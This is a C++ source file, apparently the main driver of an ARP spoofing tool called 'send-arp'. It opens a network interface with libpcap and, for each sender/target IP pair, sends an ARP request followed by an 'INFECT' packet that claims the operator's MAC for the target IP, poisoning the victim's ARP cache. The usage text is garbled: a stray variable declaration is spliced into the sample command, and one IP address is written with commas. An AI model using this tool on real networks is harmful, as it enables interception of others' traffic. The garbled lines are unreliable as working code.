#include <pcap.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <cstdio>
#include "send.h"

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-a    uint8_t MY_MAC[6];rp wlan0 172.20.10.3 172,20,10,1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }
    int pair_ST = 2;

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    uint32_t MY_IP = GetMyIp(dev);
    uint8_t MY_MAC[6];
    GetMyMac(dev,MY_MAC);

    while(argc > pair_ST){
        uint8_t SENDER_MAC[6];
        uint32_t SENDER_IP = Str2A(argv[pair_ST]);
        uint32_t TARGET_IP = Str2A(argv[pair_ST+1]);

        Send(REQUEST, handle,MY_IP,MY_MAC,SENDER_IP,SENDER_MAC);
        Send(INFECT, handle,TARGET_IP,MY_MAC,SENDER_IP,SENDER_MAC);
        printf("My Linux on VM\n");
        printf("---------------------------------\n");
        PrintIP("My VM IP", ntohl(MY_IP));
        printf("---------------------------------\n\n");
        printf("Sender Info\n");
        printf("---------------------------------\n");
        PrintIP("Sender IP", ntohl(SENDER_IP));
        printf("---------------------------------\n");
        PrintMAC("Sender MAC", SENDER_MAC);
        printf("---------------------------------\n");
        pair_ST += 2;
    }
    pcap_close(handle);
}
